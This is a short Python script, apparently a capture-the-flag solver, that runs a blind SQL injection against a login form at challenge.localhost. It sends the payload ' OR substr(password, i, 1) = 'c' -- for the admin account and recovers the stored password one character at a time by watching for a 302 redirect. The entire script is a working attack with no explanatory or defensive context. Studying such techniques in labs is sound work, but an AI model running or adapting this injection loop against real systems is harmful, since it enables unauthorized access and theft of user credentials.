import requests
import string

chars = string.printable

current_flag = ""

for i in range(40):
    for c in chars:
        response = requests.post("http://challenge.localhost:80", 
                             data={'username': 'admin', 
                                   'password': f"' OR substr(password, {1 + i}, 1) = '{c}' --"},
                                   allow_redirects=False)
        if response.status_code == 302:
            current_flag += c
            break


print(current_flag)
